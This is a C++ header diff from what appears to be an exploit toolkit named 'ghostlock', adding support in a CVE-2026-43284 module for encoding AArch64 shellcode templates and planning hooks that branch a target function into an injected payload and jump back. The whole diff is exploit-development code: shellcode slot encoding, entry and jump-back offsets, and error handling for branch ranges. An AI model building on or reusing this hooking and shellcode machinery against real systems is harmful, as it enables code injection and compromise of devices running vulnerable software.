@@ -34,6 +34,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
     inline constexpr std::size_t kShellcodeAlign = 16U;
     inline constexpr std::size_t kShellcodeMaxSlots = 16U;
     inline constexpr std::uint32_t kAarch64BranchOpcode = 0x14000000U;
+    /* Sentinel for ShellcodeTemplate::jump_back_offset: the jump-back word is
+     * the last four bytes of the 16-byte-padded image (the original templates
+     * all put it there). Upstream libcxx.S is not 16-byte long, so its template
+     * names the jump-back word explicitly instead. */
+    inline constexpr std::size_t kShellcodeAutoJumpBack =
+            static_cast<std::size_t>(-1);
 
     enum class ShellcodeSlotKind : std::uint8_t {
         Immediate32 = 0U,
@@ -55,6 +61,13 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         std::size_t size = 0U;
         const ShellcodeSlotSpec *slots = nullptr;
         std::size_t slot_count = 0U;
+        /* Offset of the executable entry inside the blob. Most templates are
+         * pure code (0); the upstream libcxx.S blob stores its strings first,
+         * so its entry is libcxx_start - libcxx_data. */
+        std::size_t entry_offset = 0U;
+        /* Offset of the 4-byte jump-back word. kShellcodeAutoJumpBack keeps
+         * the original behaviour (the last word of the padded image). */
+        std::size_t jump_back_offset = kShellcodeAutoJumpBack;
     };
 
     struct ShellcodeBinding final {
@@ -80,6 +93,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         DuplicateSlot,
         ValueTooLong,
         BadSlotKind,
+        EmptyValue,
     };
 
     /* Encode template + bindings into out. out_size receives the zero-padded
@@ -117,6 +131,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         std::uint32_t displaced_instruction = 0U;
         bool guard_skipped = false;
         std::uint32_t guard_instruction = 0U;
+        std::size_t entry_offset = 0U;      /* executable entry within payload */
+        std::size_t jump_back_offset = 0U;  /* where jump_back_instruction goes */
     };
 
     enum class HookPlanError : std::uint8_t {
@@ -126,10 +142,19 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         ShellcodeMisaligned,
         PayloadNotMapped,
         BranchOutOfRange,
+        EntryOutOfRange,
+        JumpBackOutOfRange,
     };
 
+    /* entry_offset is the blob entry the hook branch must target; it defaults
+     * to 0 (pure-code templates). jump_back_offset defaults to the last word of
+     * the padded image; pass the template's explicit offset when the raw blob
+     * is not a multiple of kShellcodeAlign (upstream libcxx.S). */
     [[nodiscard]] bool build_hook_plan(const HookTarget &target, std::size_t shellcode_bytes,
-                                       HookPlan &out, HookPlanError &error) noexcept;
+                                       HookPlan &out, HookPlanError &error,
+                                       std::size_t entry_offset = 0U,
+                                       std::size_t jump_back_offset =
+                                               kShellcodeAutoJumpBack) noexcept;
 
 } // namespace ghostlock::backend::cve_2026_43284::steps
 
